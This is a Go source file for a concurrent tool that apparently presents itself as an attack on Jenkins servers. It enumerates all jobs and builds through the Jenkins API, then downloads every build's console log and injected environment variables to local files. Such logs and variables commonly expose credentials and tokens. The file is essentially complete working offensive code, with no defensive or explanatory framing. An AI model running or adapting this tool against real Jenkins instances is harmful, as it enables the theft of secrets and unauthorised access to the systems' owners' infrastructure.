package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"sync"
	"time"

	"./jenkinz"
)

var (
	timeout     int
	concurrency int
	domain      string
	jobs        []string
)

type Attack struct {
	Domain string
	Host   string
}

func init() {
	flag.Usage = jenkinz.Usage
	flag.IntVar(&timeout, "timeout", 30, "Timeout for the tool in seconds")
	flag.IntVar(&concurrency, "c", 5, "Number of concurrent fetchers")
	flag.StringVar(&domain, "d", "", "URL of Jenkins Instance")
}

func main() {
	flag.Parse()
	attck := new(Attack)
	jenkinz.Jenkinz.Timeout = time.Duration(timeout) * time.Second
	if len(domain) < 1 {
		log.Fatalf("Usage: %s -d http://<jenkins>\n", os.Args[0])
	}
	attck.Domain = domain
	u, err := url.Parse(domain)
	if err != nil {
		log.Fatalf("Error parsing target: %v\n", err)
	}
	attck.Host = u.Hostname()
	// create output folder for host
	jenkinz.CreateHost(attck.Host)
	attck.GetJobs()

	buildChan := make(chan *jenkinz.Build)
	finishedChan := make(chan string)
	var wg, wg2 sync.WaitGroup
	wg2.Add(1)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attck.SaveLogs(buildChan, finishedChan)
		}()
	}
	go func() {
		defer wg2.Done()
		for str := range finishedChan {
			log.Printf("%s\n", str)
		}
	}()
	go func() {
		for _, job := range jobs {
			jenkinz.CreateDir(fmt.Sprintf("output/%s/%s", attck.Host, job))
			builds := attck.GetBuilds(job)
			for _, build := range builds {
				buildChan <- &jenkinz.Build{Job: job, Id: build}
			}
		}
		close(buildChan)
	}()

	wg.Wait()
	close(finishedChan)
	wg2.Wait()
}
func (a Attack) GetJobs() {
	url := fmt.Sprintf("%s/api/json?tree=jobs[name,color]", a.Domain)
	resp, err := jenkinz.Jenkinz.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	x := new(jenkinz.Jobs)
	err = json.NewDecoder(resp.Body).Decode(&x)
	if err != nil {
		log.Fatal(err)
	}
	for _, x := range x.Jobs {
		jobs = append(jobs, x.Name)
	}
}
func (a Attack) GetBuilds(job string) []string {
	var builds []string
	url := fmt.Sprintf("%s/job/%s/api/json?tree=builds[id]", a.Domain, job)
	resp, err := jenkinz.Jenkinz.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	x := new(jenkinz.Builds)
	err = json.NewDecoder(resp.Body).Decode(&x)
	if err != nil {
		log.Fatal(err)
	}
	for _, x := range x.Builds {
		builds = append(builds, x.ID)
	}
	return builds
}

func (a Attack) SaveLogs(buildChan chan *jenkinz.Build, resultChan chan string) {
	for build := range buildChan {
		// get console output of Build.
		url := fmt.Sprintf("%s/job/%s/%s/consoleText", a.Domain, build.Job, build.Id)
		resp, err := jenkinz.Jenkinz.Get(url)
		if err != nil {
			log.Fatal(err)
		}
		r, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		file := fmt.Sprintf("output/%s/%s/%s.txt", a.Host, build.Job, build.Id)
		err = ioutil.WriteFile(file, r, 0644)
		if err != nil {
			log.Fatalf("Error: %v", err)
		}
		// Get environment variables for build.
		url = fmt.Sprintf("%s/job/%s/%s/injectedEnvVars/export/api/json", a.Domain, build.Job, build.Id)
		resp, err = jenkinz.Jenkinz.Get(url)
		if err != nil {
			log.Fatal(err)
		}
		r, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Println(err)
			return
		}
		file = fmt.Sprintf("output/%s/%s/%s_env.txt", a.Host, build.Job, build.Id)
		err = ioutil.WriteFile(file, r, 0644)
		if err != nil {
			log.Printf("Error: %v", err)
		}
		resultChan <- fmt.Sprintf("Wrote log for build %s of %s", build.Id, build.Job)
	}
}
